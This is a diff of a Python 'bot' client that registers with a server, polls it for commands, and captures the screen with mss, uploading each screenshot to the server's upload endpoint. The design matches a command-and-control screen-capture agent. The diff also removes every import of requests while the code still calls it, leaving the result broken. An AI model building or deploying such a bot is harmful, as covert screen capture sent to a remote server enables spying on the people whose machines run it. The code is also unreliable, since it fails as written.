@@ -5,7 +5,6 @@ import subprocess
 from dotenv import load_dotenv
 import mss
 import mss.tools
-import requests
 import json
 
 # Load environment variables
@@ -25,7 +24,7 @@ def check_in(server_url):
         time.sleep(5)  # Wait 5 seconds before retrying
     return False
 
-def receive_commands(server_url):
+def receive_commands(server_url, bot_id):
     while True:
         response = requests.get(f"{server_url}/get_commands/{bot_id}")
         if response.status_code == 200:
@@ -36,16 +35,11 @@ def receive_commands(server_url):
                     send_screenshot(server_url, filepath)
         time.sleep(10)
 
-
 def take_screenshot():
     with mss.mss() as sct:
-        # The screen part to capture
         monitor = sct.monitors[1]  # Captures the first monitor
         output = 'screen_capture.png'  # Path to store the screenshot file
-
-        # Grab the data
         sct_img = sct.shot(mon=monitor, output=output)
-
         print(f"Screenshot saved to {output}")
         return output
 
@@ -55,27 +49,6 @@ def send_screenshot(server_url, filepath):
         response = requests.post(f"{server_url}/upload_screenshot", files=files)
         print("Screenshot sent to server:", response.status_code)
 
-
-def execute_command(command_data):
-    command = command_data.get('command')
-    if command and command in allowed_commands:  # Only allow predefined commands
-        try:
-            result = subprocess.run(command, shell=False, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            print("Command output:", result.stdout)
-        except subprocess.CalledProcessError as e:
-            print("Failed to execute command:", e)
-
-
-@app.route('/send_command', methods=['POST'])
-def handle_command():
-    data = request.json
-    # Process the command here, for example:
-    print(f"Received command: {data}")
-    # Implement action based on received command
-    return jsonify({"message": "Command received", "your_data": data}), 200
-
-import requests
-
 def register_bot(server_url, bot_id):
     response = requests.post(f"{server_url}/register", json={"id": bot_id})
     if response.status_code == 200:
@@ -83,16 +56,14 @@ def register_bot(server_url, bot_id):
     else:
         print("Registration failed", response.json())
 
-if __name__ == "__main__":
-    server_url = os.getenv('SERVER_URL', 'http://127.0.0.1:8080')
-    bot_id = "bot1"
+def main():
+    server_url = os.getenv('SERVER_URL', 'http://127.0.0.1:8080')  # Default to local server
+    bot_id = "bot1"  # Default bot identifier
     if check_in(server_url):
         try:
-            receive_commands(server_url)
+            receive_commands(server_url, bot_id)
         except Exception as e:
             print(f"Error occurred: {e}")
 
-
-server_url = os.getenv('SERVER_URL', 'http://127.0.0.1:8080')  # Use environment variable for server URL
-if check_in(server_url):
-    receive_commands(server_url)
+if __name__ == "__main__":
+    main()
